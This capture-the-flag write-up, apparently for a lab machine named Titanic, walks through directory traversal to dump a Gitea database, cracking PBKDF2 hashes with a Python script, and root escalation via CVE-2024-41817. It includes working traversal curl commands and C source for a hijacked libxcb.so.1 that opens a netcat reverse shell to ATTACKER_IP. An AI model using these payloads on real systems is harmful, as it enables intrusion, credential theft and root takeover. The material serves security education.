Apache web app with a "Book a Trip" feature that returns ticket-named JSON files via a `/download?ticket=` endpoint, vulnerable to a directory traversal that leaks `/etc/passwd` and — combined with a `dev.titanic.htb` Gitea subdomain disclosing a custom installation path — allows extraction of the Gitea SQLite database. A custom PBKDF2 cracker against the `developer` row yields the SSH password. Privilege escalation via **CVE-2024-41817** — a root-owned cron-like script invokes ImageMagick from a directory writable by `developer`, and the `magick` binary's `RUNPATH` lets a hostile `libxcb.so.1` in that directory be loaded before the system version, executing a constructor as root.

## Reconnaissance & Enumeration

The objective of this phase was to enumerate exposed services and identify the application stack worth attacking.

### Port Scan

A single combined Nmap scan covered every TCP port with default scripts and version detection:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.129.211.231 -oA nmap-out
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux
```

Two ports — SSH and HTTP — and a redirect to `titanic.htb` that signalled name-based virtual hosting. SSH was deprioritised as the OpenSSH version is current. The domain was added to `/etc/hosts`:

```bash
echo "10.129.211.231 titanic.htb" | sudo tee -a /etc/hosts
```

### Web Application — The Booking Feature

The site is a static marketing page for a fictional cruise company, with only one interactive element: a "Book a Trip" button that opens a modal accepting name, surname, email, phone, and a destination. Filling out the form and submitting it triggered the download of a JSON file containing the submitted data — an unusual UX choice that immediately invited a closer look at the HTTP exchange.

Capturing the flow in Burp Suite revealed a two-request pattern:

```http
POST /book HTTP/1.1
Host: titanic.htb
Content-Type: application/json

{"name":"test","surname":"test","email":"test@test.com","phone":"123","trip":"northern-lights"}
```

The response returned a JSON object with a single useful field:

```json
{"ticket":"a8f3c2e1-9d4b-4567-bcde-1234567890ab.json"}
```

The browser then issued a follow-up `GET /download?ticket=a8f3c2e1-9d4b-4567-bcde-1234567890ab.json`, which streamed back the JSON file. Two design decisions made this exploitable. First, the booking artefact is stored on disk and fetched by name rather than served from memory. Second, the `ticket` parameter is a filename rather than an opaque ID — which means it might be interpolated directly into a filesystem path.

### Directory Traversal via `/download?ticket=`

Replacing the ticket value with a path traversal sequence pointing at a known file confirmed the bug:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
```

The endpoint reads `/etc/passwd` with no constraints — a textbook **directory traversal** (often called Local File Inclusion in this context). The `developer` user with a real login shell stood out as the obvious target for any credential found later.

### Subdomain Enumeration

The titanic.htb app held nothing else of interest, so the next move was to look for sibling vhosts. `ffuf` with Host-header fuzzing is the standard approach: every request goes to the same IP but with a different `Host` header, and the response size or status code differentiates valid vhosts from the catch-all:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -H "Host: FUZZ.titanic.htb" -u http://titanic.htb
```

Every response returned the same body length (10 lines), which is ffuf's "wildcard hit" signal — the apex vhost catches every Host header. Filtering by line count `-fl 10` removed the noise:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -H "Host: FUZZ.titanic.htb" -u http://titanic.htb -fl 10
dev                     [Status: 200, Size: ...]
```

A `dev` vhost responded with a distinct page. Added to `/etc/hosts`:

```bash
echo "10.129.211.231 dev.titanic.htb" | sudo tee -a /etc/hosts
```

### `dev.titanic.htb` — Gitea Instance

Browsing to `http://dev.titanic.htb/` loaded a **Gitea** code-hosting instance. The `developer` user had two public repositories visible in *Explore*:

- A Flask application (probably the source of the booking feature)
- A `docker-config` repository

The Flask app was the obvious place to look for booking-feature insight, but `docker-config` was more valuable for privilege escalation purposes — Docker compose files routinely disclose volume mounts, environment variables, service paths, and credentials. Inspecting it revealed the on-disk layout for the Gitea service itself:

```yaml
# excerpt from docker-compose.yml
services:
  gitea:
    volumes:
      - /home/developer/gitea/data:/data
```

This is the bridge between the two halves of the attack. The Gitea container's `/data` is mounted from `/home/developer/gitea/data` on the host — and the host's filesystem is reachable through the `/download?ticket=` traversal sink.

## Exploitation

### Locating the Gitea App Configuration

Gitea stores its operational configuration in `app.ini`, which lives in the `conf/` subdirectory of its work directory. The canonical paths for a Gitea installation are `/etc/gitea/app.ini` or `<WORK_DIR>/custom/conf/app.ini`. Given the docker-config disclosure, the natural first attempt was the standard data path:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/conf/app.ini"
# (empty / error)
```

That failed. Gitea on this box wasn't using the default layout, which meant brute-forcing the directory structure under `/home/developer/gitea/data/` was the next step. `ffuf` again, this time against the LFI endpoint with file-extension fuzzing for `.db` and `.ini`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/FUZZ" \
     -t 10 -e ".db,.ini"
git                     [Status: 200, Size: ...]
```

One hit: `git`. Walking deeper:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/git/FUZZ" \
     -t 10 -e ".db,.ini"
.ssh                    [Status: 200, Size: ...]
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/git/.ssh/FUZZ" \
     -t 10 -e ".db,.ini"
environment             [Status: 200, Size: ...]
```

The `.ssh/environment` file inside the git user's home is a Gitea-specific artefact. Gitea uses an SSH-based git protocol implementation where users push and pull as the `git` system user; the `environment` file is sourced by sshd at login time and contains the variables that tell Gitea where its work directory lives. Reading it revealed the real path:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/git/.ssh/environment"
GITEA_WORK_DIR=/home/developer/gitea/data/gitea
[...]
```

The `WORK_DIR` is the *child* `gitea/` directory under `/data/` — `/home/developer/gitea/data/gitea/`. That extra path component had no business being there by convention, which is exactly why the standard guess failed.

### Extracting the Gitea Database

With the correct path established, downloading `app.ini` was a direct curl:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/conf/app.ini" > app.ini
grep -E "^(DB_TYPE|PATH)" app.ini
DB_TYPE  = sqlite3
PATH     = /data/gitea/gitea.db
```

Gitea uses SQLite for this deployment — meaning the entire user table is in a single file, and that file is readable through the same LFI:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db" > gitea.db
```

A standard SQLite query against the dumped database pulled the user table:

```bash
sqlite3 gitea.db
sqlite> SELECT id, name, passwd, salt, passwd_hash_algo FROM user;
1|administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b|pbkdf2$50000$50
2|developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34|pbkdf2$50000$50
```

The `developer` row was the target — that name matches the system user with a login shell discovered earlier. Two pieces matter for the cracking step:

```text
hash : e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
salt : 8bf3e3452b78544f8bee9400d6936d34
algo : pbkdf2$50000$50
```

The `passwd_hash_algo` string parses as **PBKDF2** with **50,000 iterations** and a **50-byte output key length**.

### Cracking PBKDF2-SHA256 with a Non-Standard Key Length

Hashcat does support PBKDF2-HMAC-SHA256 (mode 10900), but its default expectation for derived-key length is 32 bytes (the natural SHA-256 output size). Gitea's `$50` output-length parameter pushes that to 50 bytes, which doesn't fit the canonical mode and would require either custom hashcat tuning or hand-rolled tooling.

A short Python script was the simpler path. `hashlib.pbkdf2_hmac` accepts an explicit `dklen`, so the only loop logic needed is iterating the wordlist and comparing derived keys to the target:

```python
import hashlib
import binascii
from pwn import log

# Parameters from gitea.db
salt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')
key = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'
dklen = 50
iterations = 50000


def hash(password, salt, iterations, dklen):
    return hashlib.pbkdf2_hmac(
        hash_name='sha256',
        password=password,
        salt=salt,
        iterations=iterations,
        dklen=dklen,
    )


dict = '/usr/share/wordlists/rockyou.txt'
bar = log.progress('Cracking PBKDF2')

with open(dict, 'r', encoding='utf-8') as f:
    for line in f:
        password = line.strip().encode('utf-8')
        hashValue = hash(password, salt, iterations, dklen)
        target = binascii.unhexlify(key)
        bar.status(f'Trying: {password}')
        if hashValue == target:
            bar.success(f'Found password: {password}!')
            break
```

Running this against rockyou took noticeably longer than a typical cracking pass — 50,000 SHA-256 iterations per candidate is the entire point of PBKDF2's design — but the password eventually fell:

```bash
python3 -m venv cracker
source ./cracker/bin/activate
pip3 install pwn
python3 cracker.py
[+] Cracking PBKDF2: Found password: b'25282528'!
```

Recovered password: **`25282528`** — a numeric password that happened to be in rockyou despite looking otherwise unguessable. It's a repetition pattern that occurs naturally enough to make wordlists.

## Privilege Escalation — `developer` → `root` (CVE-2024-41817)

With a shell as `developer`, the standard checks ran. `sudo -l` was empty, `ps aux` had nothing obviously interesting, and the home directory contained only the user flag. The breakthrough came from `/opt`:

```bash
ls -la /opt
drwxr-xr-x  5 root root      4096 Feb  7 10:37 .
drwxr-xr-x 19 root root      4096 Feb  7 10:37 ..
drwxr-xr-x  5 root developer 4096 Feb  7 10:37 app
drwx--x--x  4 root root      4096 Feb  7 10:37 containerd
drwxr-xr-x  2 root root      4096 Feb  7 10:37 scripts
```

A `scripts/` directory owned by root, and an `app/` directory whose group is `developer` — meaning the current user can write files inside it. The combination is the privesc setup.

```bash
cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

The script changes into `/opt/app/static/assets/images`, truncates `metadata.log`, and runs ImageMagick's `magick identify` against every `*.jpg` in that directory, appending the output to `metadata.log`. The script itself is owned by root (`-rwxr-xr-x 1 root root`), and the way it's running periodically without `developer` invoking it manually means there's a root-owned cron or systemd timer triggering it.

Two structural facts make this exploitable:

- The script runs **as root** (otherwise it couldn't truncate a root-owned log).
- The script `cd`s into a directory **writable by `developer`**, then invokes a binary from `/usr/bin/`.

The combination is the precondition for **CVE-2024-41817**, an ImageMagick library-loading flaw in builds shipping with a relative or `$ORIGIN`-anchored `RUNPATH`. When `magick` starts up, the dynamic linker walks the library search path looking for dependencies like `libxcb.so.1`. Because of the misconfigured `RUNPATH`, the current working directory (or paths derived from it) gets consulted before the system library directories — and if a file named `libxcb.so.1` exists there, it gets loaded *as the system library*. Any code inside that shared object — including a function tagged with the GCC `__attribute__((constructor))` — executes during `dlopen` time, before `main()` runs, with whatever privileges the calling process holds. Here, that's root.

Triggering the bug is therefore three lines of C and one `gcc` invocation.

### Confirming the Vulnerable Version

```bash
magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
```

Version 7.1.1-35 falls within the affected range for CVE-2024-41817. Confirming the script actually runs periodically — and from the directory the developer can write to — was a quick sanity check: dropping a fresh JPEG into the images directory and waiting:

```bash
wget http://<ATTACKER_IP>/testImage.jpg
# ... wait a minute ...
cat /opt/app/static/assets/images/metadata.log
/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 ...
/opt/app/static/assets/images/testImage.jpg JPEG 3440x1337 ...
```

The new entry confirmed the script runs on a short interval (under a minute) and operates on user-supplied content in that directory.

### Building the Malicious Shared Object

A minimal C source defining a constructor that fires a netcat reverse shell:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("busybox nc <ATTACKER_IP> 9001 -e /bin/bash");
    exit(0);
}
```

A few notes on the choices. `__attribute__((constructor))` is the GCC attribute that marks a function to run automatically when the shared object is loaded — before any of its symbols are used. `busybox nc` is used instead of plain `nc` because Ubuntu's `nc-openbsd` doesn't support `-e`, while `busybox nc` (typically present on minimal Ubuntu installs) does. The `exit(0)` after spawning the shell prevents ImageMagick from continuing — without it, the parent process would carry on trying to use a libxcb that doesn't actually export the expected symbols, likely crashing in a noisier way.

Compiled as a position-independent shared library named after the system library it impersonates:

```bash
gcc -shared -fPIC -o libxcb.so.1 exploit.c
```

A netcat listener was started on the attacker box:

```bash
sudo nc -lvnp 9001
listening on [any] 9001 ...
```

The compiled `libxcb.so.1` was placed in `/opt/app/static/assets/images/` — the same directory the script `cd`s into before invoking `magick`. Within a minute, the next scheduled run of `identify_images.sh` loaded the malicious library, executed the constructor, and the listener caught the callback as root:

```bash
sudo nc -lvnp 9001
listening on [any] 9001 ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [10.129.211.231] 57464
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

## Key Takeaways

- **Filename parameters are guilty until proven innocent.** Any HTTP parameter whose name or value looks like a filesystem path — `file`, `path`, `download`, `ticket`, `image`, `template` — should be the first thing tested with `../` sequences. The `/download?ticket=` endpoint on Titanic is the textbook shape: a UUID-like value that happens to be interpolated straight into a filesystem read.
- **Subdomain enumeration belongs in every web-app engagement.** Apex domains often hold the marketing site, but the *interesting* application — admin panels, internal tooling, CI/CD systems, code hosting — lives on `dev`, `staging`, `internal`, `git`, `ci`. ffuf's vhost-fuzzing mode is the right tool, and the wildcard-response filter (`-fl <N>` or `-fs <bytes>`) is non-optional because catch-all configurations would otherwise drown out the real findings.
- **Configuration disclosure compounds with directory-traversal sinks.** The directory-traversal bug on its own would have only leaked `/etc/passwd`. The Gitea `docker-config` repo on its own would have only documented the data layout. Together, they're a complete database extraction primitive — you have to know *what* file to ask for *and* where it lives, and once you have both, the traversal sink delivers it.
- **PBKDF2 with non-standard `dklen` defeats stock cracking tooling.** Standard hashcat modes assume canonical output lengths (32 bytes for SHA-256). Custom deployments that override `dklen` — Gitea's 50-byte output here is a real example — don't match those modes out of the box. A 30-line Python loop using `hashlib.pbkdf2_hmac` works perfectly fine for any single hash, and the slowness of PBKDF2 doesn't matter much when the wordlist is finite. *Hashcat is the right tool when you have ten thousand hashes; Python is the right tool when you have one.*
- **Shared library hijacking remains an under-appreciated privesc primitive.** CVE-2024-41817 is the latest in a long line of "binary X looks up library Y in a path the attacker can write to" bugs. The combination of *root-owned script* + *attacker-writable CWD* + *binary with misconfigured RPATH/RUNPATH* should be flagged as a critical finding in any post-exploitation review, even when the binary in question is not currently known-vulnerable — the configuration alone is the bug.
- **Periodic root scripts that touch attacker-influenced directories are an open invitation.** The `identify_images.sh` design — root processing user-controlled files from a writable directory — is structurally unsound regardless of which binary it uses. Even without the ImageMagick RUNPATH issue, the script's reliance on `xargs` with shell-meta-sensitive filenames would have been exploitable through clever filename crafting. The fix is to run such jobs as a dedicated low-privileged user and pipe results through an unprivileged channel.
